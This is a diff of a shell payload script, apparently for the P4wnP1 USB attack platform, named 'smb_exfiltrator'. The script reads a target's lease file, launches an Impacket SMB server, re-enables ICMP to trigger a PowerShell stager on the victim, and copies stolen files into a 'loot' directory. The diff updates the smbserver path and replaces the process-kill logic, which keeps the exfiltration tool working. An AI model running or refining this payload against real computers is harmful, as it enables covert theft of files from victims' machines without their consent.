@@ -16,6 +16,21 @@ TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);
 TARGET_IP=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f3);
 HOST_IP=$(ifconfig usbeth | awk '$1=="inet"{print $2}');
 
+echo "[*] Killing smbserver..."
+process=$(ps aux | grep 'smbserver' | grep -v 'grep')
+
+# Check if the process was found
+if [ ! -z "$process" ]; then
+    # Extract the PID
+    pid=$(echo $process | awk '{print $2}')
+
+    # Kill the process
+    kill $pid
+
+    echo "Process 'smbserver' with PID $pid has been terminated."
+else
+    echo "No 'smbserver' process found."
+fi
 
 # Remove temporary loot directory if exist
 rm -rf /loot
@@ -36,7 +51,7 @@ mkdir -p $LOOTDIR/$HOST-$COUNT
 mkdir -p /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT
 
 # Start the SMB Server
-python /usr/local/bin/smbserver.py s /loot/smb_exfiltrator -smb2support &
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py s /loot/smb_exfiltrator -smb2support &
 
 # Re-enable ICMP/echo replies to trip the powershell stager
 echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
@@ -61,8 +76,20 @@ cp -R /loot/smb_exfiltrator/e/* $LOOTDIR/$HOST-$COUNT
 # Clean up temporary loot directory
 rm -rf /loot
 
-killall /usr/bin/python2
-killall /usr/bin/python2
-killall /usr/bin/python2
+echo "[*] Killing smbserver..."
+process=$(ps aux | grep 'smbserver' | grep -v 'grep')
+
+# Check if the process was found
+if [ ! -z "$process" ]; then
+    # Extract the PID
+    pid=$(echo $process | awk '{print $2}')
+
+    # Kill the process
+    kill $pid
+
+    echo "Process 'smbserver' with PID $pid has been terminated."
+else
+    echo "No 'smbserver' process found."
+fi
 P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
 ######## FINISH ########
